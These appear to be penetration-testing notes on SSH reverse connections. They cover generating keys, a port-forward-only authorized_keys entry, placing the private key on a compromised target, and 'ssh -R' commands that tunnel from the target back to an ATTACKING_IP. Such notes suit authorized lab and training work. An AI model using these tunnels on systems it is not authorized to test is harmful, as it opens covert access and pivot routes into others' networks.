# SSH Reverse Connections

## Access your machine from the target using your creds (NOT ADVISED) or a key-based system

#### 1: Generate a new set of SSH keys, then store them somewhere safe.

    ssh-keygen

#### 2: Copy the contents of the public key (.pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine.

#### You may need to create the "~/.ssh" directory and "authorized_keys" file first.

    mkdir ~/.ssh
    touch ~/.ssh/authorized_keys

#### 3: On a new line, type the following, then paste in the public key:

    "echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty *

#### * This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

#### 4: Check if the SSH server is running:

    sudo systemctl status ssh

    sudo systemctl start ssh

#### 5: Transfer the private key to the target box.

#### 6: Connect back with a reverse port forward:

    ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

#### reverse proxy: 

    ssh -R PORT USER@ATTACKING_IP -i KEYFILE -fN
